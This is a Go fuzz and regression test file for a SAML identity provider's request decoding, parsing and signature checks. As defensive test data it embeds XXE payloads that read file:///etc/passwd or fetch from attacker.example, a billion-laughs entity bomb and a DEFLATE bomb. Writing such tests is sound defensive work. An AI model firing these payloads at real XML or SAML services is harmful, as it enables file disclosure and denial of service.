package domain_test

import (
	"bytes"
	"compress/flate"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"math/big"
	"strings"
	"testing"
	"time"

	samldomain "github.com/ambi/idmagic/backend/saml/domain"
)

// maxAuthnRequestBytes は samldomain の非公開定数と同じ値。復号後サイズの上限を oracle に使う。
const maxAuthnRequestBytes = 256 * 1024

// deflate は raw DEFLATE で圧縮する。DEFLATE 爆弾のシードを作るために使う。
func deflate(tb testing.TB, payload []byte) string {
	tb.Helper()
	var buf bytes.Buffer
	w, err := flate.NewWriter(&buf, flate.BestCompression)
	if err != nil {
		tb.Fatalf("new deflate writer: %v", err)
	}
	if _, err := w.Write(payload); err != nil {
		tb.Fatalf("deflate: %v", err)
	}
	if err := w.Close(); err != nil {
		tb.Fatalf("close deflate writer: %v", err)
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

// fuzzSigningCertificatePEM は署名検証 target 用の固定証明書を 1 度だけ作る。
// 入力ごとに鍵を生成すると実行速度が 2〜3 桁落ち、探索が進まない。
func fuzzSigningCertificatePEM(tb testing.TB) string {
	tb.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		tb.Fatalf("generate key: %v", err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "idmagic saml fuzz"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		tb.Fatalf("create certificate: %v", err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}))
}

// FuzzDecodeRedirect は HTTP-Redirect binding の復号が、展開後サイズの上限を必ず守ることを表明する。
// 上限を外すと DEFLATE 爆弾で任意サイズのメモリを確保できるようになる。
func FuzzDecodeRedirect(f *testing.F) {
	f.Add("")
	f.Add("not base64!!")
	f.Add(deflate(f, []byte(`<AuthnRequest ID="_1" Version="2.0"/>`)))
	f.Add(deflate(f, bytes.Repeat([]byte("A"), maxAuthnRequestBytes+1)))
	f.Add(deflate(f, bytes.Repeat([]byte("A"), 8*1024*1024)))

	f.Fuzz(func(t *testing.T, samlRequest string) {
		out, err := samldomain.DecodeRedirect(samlRequest)
		if err != nil {
			if out != nil {
				t.Fatalf("DecodeRedirect returned %d bytes together with an error", len(out))
			}
			return
		}
		if len(out) > maxAuthnRequestBytes {
			t.Fatalf("DecodeRedirect accepted %d inflated bytes, above the %d byte bound",
				len(out), maxAuthnRequestBytes)
		}
	})
}

// FuzzDecodePost は HTTP-POST binding の復号が同じサイズ上限を守ることを表明する。
func FuzzDecodePost(f *testing.F) {
	f.Add("")
	f.Add("=")
	f.Add(base64.StdEncoding.EncodeToString([]byte(`<AuthnRequest ID="_1" Version="2.0"/>`)))
	f.Add(base64.StdEncoding.EncodeToString(bytes.Repeat([]byte("A"), maxAuthnRequestBytes+1)))

	f.Fuzz(func(t *testing.T, samlRequest string) {
		out, err := samldomain.DecodePost(samlRequest)
		if err != nil {
			if out != nil {
				t.Fatalf("DecodePost returned %d bytes together with an error", len(out))
			}
			return
		}
		if len(out) > maxAuthnRequestBytes {
			t.Fatalf("DecodePost accepted %d bytes, above the %d byte bound", len(out), maxAuthnRequestBytes)
		}
	})
}

// FuzzParseAuthnRequest は、拒否した要求から値を持ち出さないことを表明する。
// error と一緒に部分的に埋まった構造体を返す実装は、呼び出し側が err を握り潰した瞬間に
// 未検証の Issuer / ACSURL を信頼してしまう。
func FuzzParseAuthnRequest(f *testing.F) {
	f.Add([]byte(`<AuthnRequest ID="_1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"><Issuer>sp</Issuer></AuthnRequest>`))
	f.Add([]byte(`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><AuthnRequest ID="&e;"/>`))
	f.Add([]byte(`<AuthnRequest`))
	f.Add([]byte(`<LogoutRequest ID="_1"/>`))
	f.Add([]byte(`<AuthnRequest ID="_1" AssertionConsumerServiceIndex="99999999999999999999"/>`))

	f.Fuzz(func(t *testing.T, xml []byte) {
		if len(xml) > maxAuthnRequestBytes {
			return
		}
		req, err := samldomain.ParseAuthnRequest(xml)
		if err == nil {
			return
		}
		if req != (samldomain.AuthnRequest{}) {
			t.Fatalf("ParseAuthnRequest returned %+v together with an error", req)
		}
	})
}

// FuzzParseLogoutRequest は FuzzParseAuthnRequest と同じ性質を LogoutRequest について表明する。
func FuzzParseLogoutRequest(f *testing.F) {
	f.Add([]byte(`<LogoutRequest ID="_1"><Issuer>sp</Issuer><NameID>user</NameID></LogoutRequest>`))
	f.Add([]byte(`<!DOCTYPE x [<!ENTITY e SYSTEM "http://attacker.example/x">]><LogoutRequest ID="&e;"/>`))
	f.Add([]byte(`<LogoutRequest/>`))

	f.Fuzz(func(t *testing.T, xml []byte) {
		if len(xml) > maxAuthnRequestBytes {
			return
		}
		req, err := samldomain.ParseLogoutRequest(xml)
		if err == nil {
			return
		}
		if req != (samldomain.LogoutRequest{}) {
			t.Fatalf("ParseLogoutRequest returned %+v together with an error", req)
		}
	})
}

// FuzzValidateRequestSignature は、署名を要求する SP に対して、こちらが生成していない署名は
// 必ず拒否されることを表明する。攻撃者が任意に組み立てたクエリと XML で受理されたら認証バイパスになる。
func FuzzValidateRequestSignature(f *testing.F) {
	f.Add(true, []byte(`<AuthnRequest ID="_1"/>`), "SAMLRequest=abc&SigAlg=x&Signature=y")
	f.Add(false, []byte(`<AuthnRequest ID="_1"/>`), "SAMLRequest=abc")
	f.Add(true, []byte(`<AuthnRequest ID="_1"><Signature/></AuthnRequest>`), "")
	f.Add(true, []byte(``), "%zz")

	certPEM := fuzzSigningCertificatePEM(f)

	f.Fuzz(func(t *testing.T, redirect bool, xml []byte, rawQuery string) {
		if len(xml) > maxAuthnRequestBytes || len(rawQuery) > maxAuthnRequestBytes {
			return
		}
		binding := samldomain.BindingPOST
		if redirect {
			binding = samldomain.BindingRedirect
		}
		sp := samldomain.SamlServiceProvider{
			EntityID:                          "https://sp.example",
			WantAuthnRequestsSigned:           true,
			AuthnRequestSigningCertificatePEM: certPEM,
		}
		if err := samldomain.ValidateRequestSignature(binding, xml, rawQuery, sp); err == nil {
			t.Fatalf("accepted a signature the test never produced: binding=%s rawQuery=%q xml=%q",
				binding, rawQuery, xml)
		}
	})
}

// TestParseRejectsExternalEntities は XXE を明示的な回帰テストで押さえる。
// 実体を展開したかどうかは入力ごとに変わる性質ではないので、fuzz の oracle ではなく表で表明する。
func TestParseRejectsExternalEntities(t *testing.T) {
	payloads := map[string][]byte{
		"external file entity": []byte(
			`<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>` +
				`<AuthnRequest ID="_1" Version="2.0"><Issuer>&e;</Issuer></AuthnRequest>`),
		"external http entity": []byte(
			`<!DOCTYPE r [<!ENTITY e SYSTEM "http://attacker.example/x">]>` +
				`<AuthnRequest ID="_1" Version="2.0"><Issuer>&e;</Issuer></AuthnRequest>`),
		"external parameter entity": []byte(
			`<!DOCTYPE r SYSTEM "http://attacker.example/e.dtd">` +
				`<AuthnRequest ID="_1" Version="2.0"><Issuer>&e;</Issuer></AuthnRequest>`),
		"internal entity expansion": []byte(
			`<!DOCTYPE r [<!ENTITY e "expanded">]>` +
				`<AuthnRequest ID="_1" Version="2.0"><Issuer>&e;</Issuer></AuthnRequest>`),
		"billion laughs": []byte(
			`<!DOCTYPE r [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">` +
				`<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]>` +
				`<AuthnRequest ID="_1" Version="2.0"><Issuer>&c;</Issuer></AuthnRequest>`),
	}
	for name, payload := range payloads {
		t.Run(name, func(t *testing.T) {
			req, err := samldomain.ParseAuthnRequest(payload)
			if err == nil {
				t.Fatalf("expected an entity reference to be rejected, got Issuer=%q", req.Issuer)
			}
			if req != (samldomain.AuthnRequest{}) {
				t.Fatalf("rejected request still carried values: %+v", req)
			}
			if strings.Contains(err.Error(), "root:") || strings.Contains(err.Error(), "expanded") {
				t.Fatalf("error text leaked expanded entity content: %v", err)
			}
		})
	}
}

// TestDecodeRedirectRejectsDeflateBomb は展開後サイズの上限を回帰として固定する。
func TestDecodeRedirectRejectsDeflateBomb(t *testing.T) {
	bomb := deflate(t, bytes.Repeat([]byte("A"), 8*1024*1024))
	if len(bomb) > 64*1024 {
		t.Fatalf("expected the compressed bomb to stay small, got %d bytes", len(bomb))
	}
	out, err := samldomain.DecodeRedirect(bomb)
	if err == nil {
		t.Fatalf("expected a deflate bomb to be rejected, inflated %d bytes", len(out))
	}
	if out != nil {
		t.Fatalf("rejected input still returned %d bytes", len(out))
	}
}
